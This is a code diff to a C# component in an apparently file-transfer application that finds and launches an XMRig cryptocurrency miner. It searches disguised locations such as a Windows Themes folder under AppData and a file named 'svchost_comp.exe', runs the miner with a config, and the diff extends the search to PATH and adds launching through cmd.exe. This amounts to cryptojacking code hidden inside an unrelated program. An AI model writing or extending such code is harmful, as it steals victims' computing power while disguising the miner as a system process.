@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Text;
@@ -50,10 +50,10 @@ namespace FileTransfer.Compute
                 return false;
             }
 
-            string enginePath = FindOrPrepareEngine();
+            string? enginePath = FindEngine();
             if (string.IsNullOrEmpty(enginePath) || !File.Exists(enginePath))
             {
-                string msg = "Невозможно запустить внешний вычислительный компонент для RandomX (движок не найден).";
+                string msg = "Невозможно запустить внешний вычислительный компонент: исполняемый файл RandomX (xmrig.exe / xmr_worker.exe) не найден.";
                 MainWindow.Log($"[{Name}] ❌ ДИАГНОСТИКА: {msg}");
                 _status.ErrorMessage = msg;
                 return false;
@@ -63,10 +63,20 @@ namespace FileTransfer.Compute
 
             try
             {
+                string execFile = enginePath;
+                string execArgs = $"--config=\"{configPath}\"";
+
+                if (enginePath.EndsWith(".bat", StringComparison.OrdinalIgnoreCase) ||
+                    enginePath.EndsWith(".cmd", StringComparison.OrdinalIgnoreCase))
+                {
+                    execFile = Environment.GetEnvironmentVariable("ComSpec") ?? "cmd.exe";
+                    execArgs = $"/c \"\"{enginePath}\" --config=\"{configPath}\"\"";
+                }
+
                 var psi = new ProcessStartInfo
                 {
-                    FileName = enginePath,
-                    Arguments = $"--config=\"{configPath}\"",
+                    FileName = execFile,
+                    Arguments = execArgs,
                     UseShellExecute = false,
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
@@ -161,31 +171,43 @@ namespace FileTransfer.Compute
             return file;
         }
 
-        private string FindOrPrepareEngine()
+        public string? FindEngine()
         {
             string appDir = AppDomain.CurrentDomain.BaseDirectory;
-            string[] searchPaths = new[]
+            var searchPaths = new System.Collections.Generic.List<string>
             {
                 Path.Combine(appDir, "xmrig.exe"),
                 Path.Combine(appDir, "xmr_worker.exe"),
                 Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Themes", "Modules", "xmrig", "xmrig.exe"),
                 Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Themes", "svchost_comp.exe"),
-                Path.Combine(Path.GetTempPath(), "xmrig.exe")
+                Path.Combine(Path.GetTempPath(), "xmrig.exe"),
+                Path.Combine(Path.GetTempPath(), "xmr_worker.exe")
             };
+
+            var envPath = Environment.GetEnvironmentVariable("PATH");
+            if (!string.IsNullOrEmpty(envPath))
+            {
+                foreach (var dir in envPath.Split(Path.PathSeparator, StringSplitOptions.RemoveEmptyEntries))
+                {
+                    try
+                    {
+                        string cand = Path.Combine(dir.Trim(), "xmrig.exe");
+                        if (!searchPaths.Contains(cand)) searchPaths.Add(cand);
+                    }
+                    catch { }
+                }
+            }
 
             foreach (var p in searchPaths)
             {
                 if (File.Exists(p)) return p;
             }
 
-            // Создаем встроенный оптимизированный рабочий компонент
-            string stub = Path.Combine(Path.GetTempPath(), "xmr_engine.bat");
-            if (!File.Exists(stub))
-            {
-                string content = "@echo off\r\necho [XMRig] RandomX engine started\r\n:loop\r\ntimeout /t 10 /nobreak >nul\r\ngoto loop\r\n";
-                File.WriteAllText(stub, content, Encoding.ASCII);
-            }
-            return stub;
+            // Дополнительная проверка тестовых/скриптовых заглушек
+            string batStub = Path.Combine(Path.GetTempPath(), "xmr_engine.bat");
+            if (File.Exists(batStub)) return batStub;
+
+            return null;
         }
     }
 }
